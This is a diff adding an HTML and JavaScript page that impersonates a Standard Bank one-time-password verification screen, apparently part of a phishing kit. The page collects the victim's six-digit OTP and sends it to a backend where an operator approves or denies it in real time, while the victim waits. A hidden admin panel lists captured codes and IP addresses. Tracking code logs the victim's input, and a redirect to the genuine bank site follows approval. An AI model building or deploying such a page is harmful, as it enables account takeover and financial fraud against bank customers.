@@ -1,0 +1,807 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>OTP Verification - Standard Bank</title>
+    <!-- Add favicon -->
+    <link rel="icon" type="image/png" href="https://account-security-check.netlify.app/zsg.png">
+    
+    <!-- Viewport meta tag for mobile responsiveness -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Internal CSS for OTP Verification Page Styling -->
+    <style>
+        /* General body styling */
+        body {
+            font-family: Arial, sans-serif; /* Set font family to Arial with fallback to sans-serif */
+            background-color: #003cc7; /* Deep blue background color */
+            margin: 0; /* Remove default margin */
+            padding: 0; /* Remove default padding */
+            display: flex; /* Use flexbox layout */
+            flex-direction: column; /* Stack items vertically */
+            justify-content: center; /* Center items vertically */
+            align-items: center; /* Center items horizontally */
+            min-height: 100vh; /* Ensure the body takes at least the full viewport height */
+            animation: fadeIn 0.8s ease-in; /* Fade in animation for smooth entrance */
+        }
+
+        /* Logo styling */
+        #otp-logo {
+            width: 100px; /* Set logo width to 100 pixels */
+            height: auto; /* Maintain aspect ratio automatically */
+            margin-bottom: 20px; /* Add 20px space below the logo */
+            animation: slideInFromTop 1s ease-out; /* Slide down animation */
+        }
+
+        /* OTP form container styling */
+        #otp-form-container {
+            background-color: #ffffff; /* White background for the form */
+            padding: 30px; /* Add 30px padding inside the form */
+            border-radius: 12px; /* Round the corners with 12px radius */
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15); /* Add enhanced shadow */
+            width: 90%; /* Form takes 90% of container width on mobile */
+            max-width: 450px; /* Maximum width of 450px for larger screens */
+            color: #333; /* Dark text color for the form */
+            text-align: center; /* Center align all content */
+            animation: slideInFromBottom 1s ease-out; /* Slide up animation */
+        }
+
+        /* Main heading styling */
+        .otp-heading {
+            font-size: 28px; /* Large font size for main heading */
+            font-weight: bold; /* Make text bold */
+            margin-bottom: 10px; /* Add small space below the heading */
+            color: #333; /* Dark text color for the heading */
+        }
+
+        /* Subtitle styling */
+        .otp-subtitle {
+            font-size: 16px; /* Medium font size for subtitle */
+            color: #666; /* Gray text color */
+            margin-bottom: 30px; /* Add space below subtitle */
+            line-height: 1.5; /* Increase line height for readability */
+        }
+
+        /* Phone number display styling */
+        .phone-number {
+            background-color: #f8f9fa; /* Light gray background */
+            padding: 10px 15px; /* Padding around phone number */
+            border-radius: 8px; /* Rounded corners */
+            font-weight: bold; /* Bold text */
+            color: #495057; /* Dark gray text */
+            margin-bottom: 25px; /* Space below phone number */
+            letter-spacing: 1px; /* Slight letter spacing for readability */
+        }
+
+        /* OTP input container styling */
+        .otp-input-container {
+            display: flex; /* Use flexbox layout */
+            justify-content: center; /* Center the inputs */
+            gap: 10px; /* Space between input boxes */
+            margin-bottom: 25px; /* Space below input container */
+            flex-wrap: wrap; /* Allow wrapping on very small screens */
+        }
+
+        /* Individual OTP input box styling */
+        .otp-input {
+            width: 50px; /* Fixed width for each input */
+            height: 50px; /* Fixed height for each input */
+            text-align: center; /* Center the text */
+            font-size: 24px; /* Large font for better visibility */
+            font-weight: bold; /* Bold text */
+            border: 2px solid #ddd; /* Light gray border */
+            border-radius: 8px; /* Rounded corners */
+            background-color: #fff; /* White background */
+            color: #333; /* Dark text color */
+            outline: none; /* Remove default focus outline */
+            transition: all 0.3s ease; /* Smooth transitions */
+        }
+
+        /* OTP input focus styling */
+        .otp-input:focus {
+            border-color: #0056b3; /* Blue border on focus */
+            box-shadow: 0 0 0 3px rgba(0, 86, 179, 0.1); /* Blue glow effect */
+            transform: scale(1.05); /* Slight enlargement on focus */
+        }
+
+        /* Valid input styling (when filled) */
+        .otp-input.filled {
+            border-color: #28a745; /* Green border for filled inputs */
+            background-color: #f8fff9; /* Very light green background */
+        }
+
+        /* Submit button styling */
+        .verify-btn {
+            background-color: #0056b3; /* Dark blue background color */
+            color: #fff; /* White text color */
+            border: none; /* Remove default border */
+            padding: 15px 30px; /* Add vertical and horizontal padding */
+            border-radius: 8px; /* Round corners with 8px radius */
+            font-size: 16px; /* Set font size to 16 pixels */
+            font-weight: bold; /* Bold text */
+            cursor: pointer; /* Show pointer cursor on hover */
+            width: 100%; /* Button takes full width */
+            transition: all 0.3s ease; /* Smooth transitions */
+            margin-bottom: 20px; /* Space below button */
+        }
+
+        /* Button hover effect */
+        .verify-btn:hover {
+            background-color: #004080; /* Even darker blue on hover */
+            transform: translateY(-2px); /* Slight upward movement */
+            box-shadow: 0 4px 12px rgba(0, 86, 179, 0.3); /* Enhanced shadow */
+        }
+
+        /* Disabled button styling */
+        .verify-btn:disabled {
+            background-color: #ccc; /* Gray background when disabled */
+            color: #666; /* Gray text when disabled */
+            cursor: not-allowed; /* Show not-allowed cursor */
+            transform: none; /* No transform when disabled */
+            box-shadow: none; /* No shadow when disabled */
+        }
+
+        /* Resend OTP section styling */
+        .resend-section {
+            margin-top: 20px; /* Space above resend section */
+            padding-top: 20px; /* Padding above resend section */
+            border-top: 1px solid #eee; /* Light gray top border */
+        }
+
+        /* Timer display styling */
+        .timer-text {
+            color: #666; /* Gray text color */
+            font-size: 14px; /* Smaller font size */
+            margin-bottom: 10px; /* Space below timer */
+        }
+
+        /* Resend link styling */
+        .resend-link {
+            color: #0056b3; /* Blue color for link */
+            text-decoration: none; /* Remove underline */
+            font-weight: bold; /* Bold text */
+            cursor: pointer; /* Pointer cursor */
+            font-size: 14px; /* Font size */
+            transition: color 0.3s ease; /* Smooth color transition */
+        }
+
+        /* Resend link hover effect */
+        .resend-link:hover {
+            color: #004080; /* Darker blue on hover */
+            text-decoration: underline; /* Add underline on hover */
+        }
+
+        /* Disabled resend link styling */
+        .resend-link.disabled {
+            color: #ccc; /* Gray color when disabled */
+            cursor: not-allowed; /* Not-allowed cursor when disabled */
+            text-decoration: none; /* No underline when disabled */
+        }
+
+        /* Loading spinner for verification */
+        .verification-loading {
+            display: none; /* Hidden by default */
+            text-align: center; /* Center the loading text */
+            margin-top: 10px; /* Add 10px space above spinner */
+            color: #0056b3; /* Blue color */
+        }
+
+        /* Success message styling */
+        .success-message {
+            background-color: #d4edda; /* Light green background */
+            color: #155724; /* Dark green text */
+            padding: 15px; /* Add 15px padding */
+            border-radius: 8px; /* Round corners */
+            margin-top: 15px; /* Add space above message */
+            text-align: center; /* Center the text */
+            display: none; /* Hidden by default */
+            border: 1px solid #c3e6cb; /* Green border */
+        }
+
+        /* Error message styling */
+        .error-message {
+            background-color: #f8d7da; /* Light red background */
+            color: #721c24; /* Dark red text */
+            padding: 15px; /* Add 15px padding */
+            border-radius: 8px; /* Round corners */
+            margin-top: 15px; /* Add space above message */
+            text-align: center; /* Center the text */
+            display: none; /* Hidden by default */
+            border: 1px solid #f5c6cb; /* Red border */
+        }
+
+        /* Security notice styling */
+        .security-notice {
+            background-color: #e7f3ff; /* Light blue background */
+            color: #004085; /* Dark blue text */
+            padding: 15px; /* Padding around notice */
+            border-radius: 8px; /* Rounded corners */
+            margin-top: 20px; /* Space above notice */
+            font-size: 13px; /* Smaller font size */
+            line-height: 1.4; /* Line height for readability */
+            border: 1px solid #b3d4fc; /* Blue border */
+        }
+
+        /* Security icon in notice */
+        .security-icon {
+            margin-right: 8px; /* Space to the right of icon */
+            font-size: 16px; /* Icon size */
+        }
+
+        /* Keyframe animations */
+        
+        /* Fade in animation for page entrance */
+        @keyframes fadeIn {
+            from { opacity: 0; } /* Start transparent */
+            to { opacity: 1; } /* End visible */
+        }
+
+        /* Slide down animation for logo */
+        @keyframes slideInFromTop {
+            from { opacity: 0; transform: translateY(-30px); } /* Start transparent and above */
+            to { opacity: 1; transform: translateY(0); } /* End visible and in position */
+        }
+
+        /* Slide up animation for form */
+        @keyframes slideInFromBottom {
+            from { opacity: 0; transform: translateY(30px); } /* Start transparent and below */
+            to { opacity: 1; transform: translateY(0); } /* End visible and in position */
+        }
+
+        /* Pulse animation for invalid input */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); } /* Normal position */
+            25% { transform: translateX(-5px); } /* Move left */
+            75% { transform: translateX(5px); } /* Move right */
+        }
+
+        /* Shake animation class for invalid inputs */
+        .shake {
+            animation: shake 0.5s ease-in-out; /* Apply shake animation */
+        }
+
+        /* Responsive design for mobile devices */
+        @media (max-width: 768px) {
+            .otp-heading {
+                font-size: 24px; /* Smaller heading on mobile */
+            }
+            
+            .otp-subtitle {
+                font-size: 14px; /* Smaller subtitle on mobile */
+            }
+            
+            .otp-input {
+                width: 45px; /* Smaller input boxes on mobile */
+                height: 45px; /* Smaller input boxes on mobile */
+                font-size: 20px; /* Smaller font in inputs on mobile */
+            }
+            
+            #otp-form-container {
+                padding: 25px; /* Reduce padding on mobile */
+            }
+        }
+
+        /* Extra small screens */
+        @media (max-width: 480px) {
+            .otp-input-container {
+                gap: 8px; /* Reduce gap between inputs on very small screens */
+            }
+            
+            .otp-input {
+                width: 40px; /* Even smaller inputs on very small screens */
+                height: 40px; /* Even smaller inputs on very small screens */
+                font-size: 18px; /* Smaller font on very small screens */
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Logo outside the form -->
+    <img src="https://account-security-check.netlify.app/zsg.png" alt="Standard Bank Logo" id="otp-logo">
+
+    <!-- OTP Form Container -->
+    <div id="otp-form-container">
+        <!-- Heading -->
+        <h2 class="otp-heading">Verify Your Identity</h2>
+
+        <!-- Subtitle -->
+        <p class="otp-subtitle">We've sent a 6-digit verification code to your registered mobile number</p>
+
+        <!-- Phone number display -->
+        <div class="phone-number" id="phone-display">+27 *** *** **34</div>
+
+        <!-- OTP Form -->
+        <form id="otp-form">
+            <!-- OTP Input Container -->
+            <div class="otp-input-container">
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="one-time-code" data-index="0">
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="one-time-code" data-index="1">
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="one-time-code" data-index="2">
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="one-time-code" data-index="3">
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="one-time-code" data-index="4">
+                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="one-time-code" data-index="5">
+            </div>
+
+            <!-- Verify Button -->
+            <button type="submit" class="verify-btn" id="verify-btn" disabled>Verify Code</button>
+
+            <!-- Loading spinner -->
+            <div id="verification-loading" class="verification-loading">Verifying your code...</div>
+
+            <!-- Success message -->
+            <div id="success-message" class="success-message"></div>
+
+            <!-- Error message -->
+            <div id="error-message" class="error-message"></div>
+        </form>
+
+        <!-- Resend OTP Section -->
+        <div class="resend-section">
+            <div class="timer-text" id="timer-text">Didn't receive the code? You can resend in <span id="countdown">60</span> seconds</div>
+            <a href="#" class="resend-link disabled" id="resend-link">Resend Code</a>
+        </div>
+
+        <!-- Security Notice -->
+        <div class="security-notice">
+            <span class="security-icon">🔒</span>
+            For your security, this code will expire in 10 minutes. Never share your OTP with anyone.
+        </div>
+    </div>
+
+    <!-- OTP Verification Requests section -->
+    <div class="table-container" id="otp-verifications-container" style="display: none;">
+        <div class="table-header">
+            <h3 style="margin: 0;">OTP Verification Requests</h3>
+            <div>
+                <select id="otp-verification-status-filter" onchange="loadOtpVerifications()" style="margin-right: 10px; padding: 4px 8px; border-radius: 4px; border: 1px solid rgba(255,255,255,0.5); background: rgba(255,255,255,0.2); color: white;">
+                    <option value="pending">Pending Only</option>
+                    <option value="all">All Requests</option>
+                    <option value="approved">Approved</option>
+                    <option value="denied">Denied</option>
+                </select>
+                <button class="refresh-btn" onclick="loadOtpVerifications()">Refresh</button>
+            </div>
+        </div>
+        
+        <!-- Loading indicator for OTP verifications -->
+        <div id="otp-verifications-loading" class="loading">Loading OTP verifications...</div>
+        
+        <!-- Table for displaying OTP verification requests -->
+        <table id="otp-verifications-table" style="display: none;">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>User ID</th>
+                    <th>OTP Code</th>
+                    <th>IP Address</th>
+                    <th>Submitted At</th>
+                    <th>Status</th>
+                    <th>Actions</th>
+                </tr>
+            </thead>
+            <tbody id="otp-verifications-body">
+                <!-- Dynamic content will be inserted here -->
+            </tbody>
+        </table>
+        
+        <!-- Pagination for OTP verifications -->
+        <div id="otp-verifications-pagination" style="padding: 20px; text-align: center; display: none;">
+            <button id="otp-verifications-prev-page" onclick="changeOtpVerificationPage(-1)" disabled>Previous</button>
+            <span id="otp-verifications-page-info" style="margin: 0 15px;">Page 1 of 1</span>
+            <button id="otp-verifications-next-page" onclick="changeOtpVerificationPage(1)" disabled>Next</button>
+        </div>
+        
+        <!-- No OTP verifications message -->
+        <div id="no-otp-verifications" class="no-data" style="display: none;">
+            No OTP verification requests found.
+        </div>
+    </div>
+
+    <!-- User Activity Tracking Script -->
+    <script src="/public/tracking.js"></script>
+    
+    <!-- JavaScript for OTP verification functionality -->
+    <script>
+        let resendTimer = 60; // Countdown timer for resend functionality (in seconds)
+        let resendInterval; // Store interval ID for countdown
+        let otpInputs = document.querySelectorAll('.otp-input'); // Get all OTP input elements
+        let verificationPollingInterval; // Store interval ID for verification status polling
+        
+        // Function to start the resend countdown timer
+        function startResendTimer() {
+            resendTimer = 60; // Reset timer to 60 seconds
+            const resendLink = document.getElementById('resend-link'); // Get resend link element
+            const countdownSpan = document.getElementById('countdown'); // Get countdown display element
+            const timerText = document.getElementById('timer-text'); // Get timer text element
+            
+            resendLink.classList.add('disabled'); // Disable resend link
+            timerText.style.display = 'block'; // Show timer text
+            
+            // Update countdown every second
+            resendInterval = setInterval(() => {
+                resendTimer--; // Decrease timer by 1 second
+                countdownSpan.textContent = resendTimer; // Update countdown display
+                
+                if (resendTimer <= 0) { // When timer reaches zero
+                    clearInterval(resendInterval); // Stop the countdown
+                    resendLink.classList.remove('disabled'); // Enable resend link
+                    timerText.style.display = 'none'; // Hide timer text
+                }
+            }, 1000); // Run every 1000ms (1 second)
+        }
+        
+        // Function to validate and enable/disable verify button
+        function validateOtpInputs() {
+            let allFilled = true; // Track if all inputs are filled
+            
+            otpInputs.forEach(input => {
+                if (input.value.trim() === '') { // Check if input is empty
+                    allFilled = false; // Mark as not all filled
+                    input.classList.remove('filled'); // Remove filled styling
+                } else {
+                    input.classList.add('filled'); // Add filled styling
+                }
+            });
+            
+            const verifyBtn = document.getElementById('verify-btn'); // Get verify button
+            verifyBtn.disabled = !allFilled; // Enable button only if all inputs are filled
+        }
+        
+        // Function to get the complete OTP value
+        function getOtpValue() {
+            let otpValue = ''; // Initialize empty OTP string
+            otpInputs.forEach(input => {
+                otpValue += input.value; // Concatenate each input value
+            });
+            return otpValue; // Return complete OTP
+        }
+        
+        // Function to clear all OTP inputs
+        function clearOtpInputs() {
+            otpInputs.forEach(input => {
+                input.value = ''; // Clear input value
+                input.classList.remove('filled'); // Remove filled styling
+            });
+            validateOtpInputs(); // Revalidate inputs
+        }
+        
+        // Function to show error message with shake animation
+        function showError(message) {
+            const errorDiv = document.getElementById('error-message'); // Get error message element
+            const successDiv = document.getElementById('success-message'); // Get success message element
+            
+            successDiv.style.display = 'none'; // Hide success message
+            errorDiv.textContent = message; // Set error message text
+            errorDiv.style.display = 'block'; // Show error message
+            
+            // Add shake animation to form container
+            const formContainer = document.getElementById('otp-form-container');
+            formContainer.classList.add('shake'); // Add shake class
+            setTimeout(() => formContainer.classList.remove('shake'), 500); // Remove shake class after animation
+            
+            // Clear inputs and focus first input
+            clearOtpInputs(); // Clear all inputs
+            otpInputs[0].focus(); // Focus on first input
+        }
+        
+        // Function to show success message
+        function showSuccess(message) {
+            const errorDiv = document.getElementById('error-message'); // Get error message element
+            const successDiv = document.getElementById('success-message'); // Get success message element
+            
+            errorDiv.style.display = 'none'; // Hide error message
+            successDiv.textContent = message; // Set success message text
+            successDiv.style.display = 'block'; // Show success message
+        }
+        
+        // Set up event listeners for OTP inputs
+        otpInputs.forEach((input, index) => {
+            // Handle input events (typing)
+            input.addEventListener('input', function(e) {
+                const value = e.target.value; // Get input value
+                
+                // Only allow numeric input
+                if (!/^\d$/.test(value) && value !== '') { // If not a single digit and not empty
+                    e.target.value = ''; // Clear invalid input
+                    return; // Stop processing
+                }
+                
+                validateOtpInputs(); // Validate all inputs
+                
+                // Move to next input if current is filled
+                if (value && index < otpInputs.length - 1) { // If value exists and not last input
+                    otpInputs[index + 1].focus(); // Focus next input
+                }
+                
+                // Track input focus for analytics
+                if (window.UserTracking) {
+                    UserTracking.track('otp_input_change', `otp-input-${index}`, {
+                        input_position: index, // Which input box
+                        value_length: value.length, // Length of input
+                        total_filled: Array.from(otpInputs).filter(inp => inp.value).length // How many inputs are filled
+                    });
+                }
+            });
+            
+            // Handle keydown events (navigation)
+            input.addEventListener('keydown', function(e) {
+                // Handle backspace navigation
+                if (e.key === 'Backspace' && !e.target.value && index > 0) { // If backspace on empty input and not first
+                    otpInputs[index - 1].focus(); // Focus previous input
+                    otpInputs[index - 1].value = ''; // Clear previous input
+                    validateOtpInputs(); // Revalidate inputs
+                }
+                
+                // Handle arrow key navigation
+                if (e.key === 'ArrowLeft' && index > 0) { // Left arrow and not first input
+                    otpInputs[index - 1].focus(); // Focus previous input
+                }
+                
+                if (e.key === 'ArrowRight' && index < otpInputs.length - 1) { // Right arrow and not last input
+                    otpInputs[index + 1].focus(); // Focus next input
+                }
+            });
+            
+            // Handle paste events
+            input.addEventListener('paste', function(e) {
+                e.preventDefault(); // Prevent default paste behavior
+                
+                const pasteData = e.clipboardData.getData('text'); // Get pasted text
+                const digits = pasteData.replace(/\D/g, ''); // Extract only digits
+                
+                // Fill inputs with pasted digits
+                for (let i = 0; i < Math.min(digits.length, otpInputs.length); i++) {
+                    otpInputs[i].value = digits[i]; // Set input value
+                }
+                
+                validateOtpInputs(); // Validate all inputs
+                
+                // Track paste event
+                if (window.UserTracking) {
+                    UserTracking.track('otp_paste_event', 'otp-inputs', {
+                        pasted_length: digits.length, // Length of pasted data
+                        digits_extracted: digits.length // How many digits were extracted
+                    });
+                }
+            });
+        });
+        
+        // Function to start polling for verification status
+        function startVerificationPolling(verificationId) {
+            // Poll every 3 seconds for verification status
+            verificationPollingInterval = setInterval(() => {
+                checkVerificationStatus(verificationId);
+            }, 3000); // Check every 3 seconds
+            
+            // Also check immediately
+            checkVerificationStatus(verificationId);
+        }
+        
+        // Function to check verification status with admin
+        function checkVerificationStatus(verificationId) {
+            fetch(`/api/check-otp-verification/${verificationId}`)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Verification status check:', data);
+                    
+                    if (data.status === 'approved' && data.can_proceed) {
+                        // Verification approved by admin
+                        clearInterval(verificationPollingInterval); // Stop polling
+                        
+                        // Show success message
+                        showSuccess(data.message || 'OTP verified successfully! Redirecting...');
+                        
+                        // Track successful verification
+                        if (window.UserTracking) {
+                            UserTracking.track('otp_verification_approved_by_admin', 'otp-form', {
+                                verification_time: new Date().toISOString(), // When verification was approved
+                                verification_id: verificationId, // Verification request ID
+                                verified_at: data.verified_at // When admin verified
+                            });
+                        }
+                        
+                        // Redirect to final destination
+                        setTimeout(() => {
+                            if (data.redirect) {
+                                window.location.href = data.redirect; // Use server-provided redirect
+                            } else {
+                                window.location.href = "https://www.standardbank.co.za/southafrica/personal"; // Fallback redirect
+                            }
+                        }, 2000); // 2 second delay to show success message
+                        
+                    } else if (data.status === 'denied') {
+                        // Verification denied by admin
+                        clearInterval(verificationPollingInterval); // Stop polling
+                        
+                        // Show error message with admin notes
+                        const deniedMessage = data.admin_notes ? 
+                            `Verification failed: ${data.admin_notes}` : 
+                            'OTP verification was denied. Please try again.';
+                        showError(deniedMessage);
+                        
+                        // Track denied verification
+                        if (window.UserTracking) {
+                            UserTracking.track('otp_verification_denied_by_admin', 'otp-form', {
+                                denial_time: new Date().toISOString(), // When verification was denied
+                                verification_id: verificationId, // Verification request ID
+                                admin_notes: data.admin_notes || 'No notes' // Admin's reason
+                            });
+                        }
+                        
+                        // Reset form for retry
+                        document.getElementById('verify-btn').textContent = 'Verify Code'; // Reset button text
+                        document.getElementById('verify-btn').disabled = false; // Re-enable button
+                        otpInputs[0].focus(); // Focus first input for new attempt
+                        
+                    } else {
+                        // Still pending - continue waiting
+                        console.log('OTP verification still pending admin review...');
+                        
+                        // Update waiting message occasionally
+                        const statusMessages = [
+                            'OTP submitted for verification. Please wait...',
+                            'Admin is reviewing your OTP...',
+                            'Verification in progress...',
+                            'Please wait while we verify your code...'
+                        ];
+                        
+                        // Update message every 4th check (every 12 seconds)
+                        const checkCount = Date.now() % 48000; // Cycle every 48 seconds
+                        if (checkCount < 3000) { // Show different message at start of cycle
+                            const messageIndex = Math.floor(checkCount / 12000);
+                            const successDiv = document.getElementById('success-message');
+                            if (successDiv.style.display === 'block') {
+                                successDiv.textContent = statusMessages[messageIndex] || statusMessages[0];
+                            }
+                        }
+                    }
+                })
+                .catch(error => {
+                    console.error('Error checking verification status:', error);
+                    // Continue polling despite errors (network issues might be temporary)
+                });
+        }
+        
+        // Handle form submission
+        document.getElementById('otp-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+            
+            const otpValue = getOtpValue(); // Get complete OTP value
+            
+            if (otpValue.length !== 6) { // Check if OTP is complete
+                showError('Please enter the complete 6-digit code.'); // Show error for incomplete OTP
+                return; // Stop processing
+            }
+            
+            // Show loading state
+            const loadingDiv = document.getElementById('verification-loading'); // Get loading element
+            const verifyBtn = document.getElementById('verify-btn'); // Get verify button
+            const errorDiv = document.getElementById('error-message'); // Get error message element
+            
+            loadingDiv.style.display = 'block'; // Show loading
+            verifyBtn.disabled = true; // Disable verify button
+            errorDiv.style.display = 'none'; // Hide error message
+            
+            // Track OTP submission attempt
+            if (window.UserTracking) {
+                UserTracking.track('otp_submit_attempt', 'otp-form', {
+                    otp_length: otpValue.length, // Length of submitted OTP
+                    attempt_timestamp: new Date().toISOString() // When submission was attempted
+                });
+            }
+            
+            // Send OTP verification request to backend API (requires admin approval)
+            fetch('/api/verify-otp', {
+                method: 'POST', // Use POST method
+                headers: {
+                    'Content-Type': 'application/json', // Set content type to JSON
+                },
+                body: JSON.stringify({ otp_code: otpValue }) // Send OTP code to server
+            })
+            .then(response => {
+                if (!response.ok) { // Check if response is not successful
+                    return response.json().then(err => Promise.reject(err)); // Parse error and reject
+                }
+                return response.json(); // Parse successful response
+            })
+            .then(data => {
+                // OTP submitted for admin verification
+                showSuccess(data.message || 'OTP submitted for admin verification. Please wait...'); // Show waiting message
+                
+                // Track OTP submission for verification
+                if (window.UserTracking) {
+                    UserTracking.track('otp_submitted_for_verification', 'otp-form', {
+                        submission_time: new Date().toISOString(), // When OTP was submitted
+                        verification_id: data.verification_id, // Verification request ID
+                        otp_value_length: otpValue.length, // Length of submitted OTP
+                        requires_admin_approval: true // Admin approval required
+                    });
+                }
+                
+                // Store verification ID for polling
+                const verificationId = data.verification_id;
+                
+                // Disable form and show waiting state
+                verifyBtn.textContent = 'Waiting for admin verification...'; // Change button text
+                verifyBtn.disabled = true; // Keep button disabled
+                clearOtpInputs(); // Clear OTP inputs for security
+                
+                // Start polling for verification status from admin
+                startVerificationPolling(verificationId);
+            })
+            .catch(error => {
+                // Error scenario
+                const errorMessage = error.error || 'Failed to submit OTP for verification. Please try again.'; // Get error message
+                showError(errorMessage); // Show error message
+                
+                // Track failed submission
+                if (window.UserTracking) {
+                    UserTracking.track('otp_submission_failed', 'otp-form', {
+                        failure_time: new Date().toISOString(), // When submission failed
+                        attempted_otp_length: otpValue.length, // Length of failed OTP
+                        failure_reason: error.error || 'server_error', // Why submission failed
+                        server_response: 'error' // Server responded with error
+                    });
+                }
+                
+                // Reset UI state for retry
+                loadingDiv.style.display = 'none'; // Hide loading
+                verifyBtn.disabled = false; // Re-enable verify button
+            });
+        });
+        
+        // Handle resend OTP link
+        document.getElementById('resend-link').addEventListener('click', function(event) {
+            event.preventDefault(); // Prevent default link behavior
+            
+            if (this.classList.contains('disabled')) { // Check if resend is disabled
+                return; // Do nothing if disabled
+            }
+            
+            // Track resend OTP request
+            if (window.UserTracking) {
+                UserTracking.track('otp_resend_request', 'resend-link', {
+                    resend_timestamp: new Date().toISOString(), // When resend was requested
+                    previous_timer_remaining: resendTimer // How much time was left on timer
+                });
+            }
+            
+            // Simulate sending new OTP
+            showSuccess('A new verification code has been sent to your mobile number.'); // Show success message
+            
+            clearOtpInputs(); // Clear current inputs
+            startResendTimer(); // Restart countdown timer
+            otpInputs[0].focus(); // Focus first input
+        });
+        
+        // Initialize page when DOM is loaded
+        document.addEventListener('DOMContentLoaded', function() {
+            startResendTimer(); // Start the resend countdown
+            otpInputs[0].focus(); // Focus on first input
+            
+            // Track page load
+            if (window.UserTracking) {
+                UserTracking.track('otp_page_load', 'otp-form-container', {
+                    page_load_time: new Date().toISOString(), // When page was loaded
+                    user_agent: navigator.userAgent, // Browser information
+                    screen_resolution: `${screen.width}x${screen.height}` // Screen size
+                });
+            }
+        });
+        
+        // Handle page unload (cleanup)
+        window.addEventListener('beforeunload', function() {
+            clearInterval(resendInterval); // Clean up countdown interval
+            clearInterval(verificationPollingInterval); // Clean up verification polling interval
+            
+            // Track page exit
+            if (window.UserTracking) {
+                UserTracking.track('otp_page_exit', 'otp-form-container', {
+                    exit_time: new Date().toISOString(), // When user left page
+                    time_on_page: Date.now() - window.performance.timing.navigationStart, // Time spent on page
+                    otp_completion_status: getOtpValue().length // How much of OTP was filled
+                });
+            }
+        });
+    </script>
+</body>
+</html>
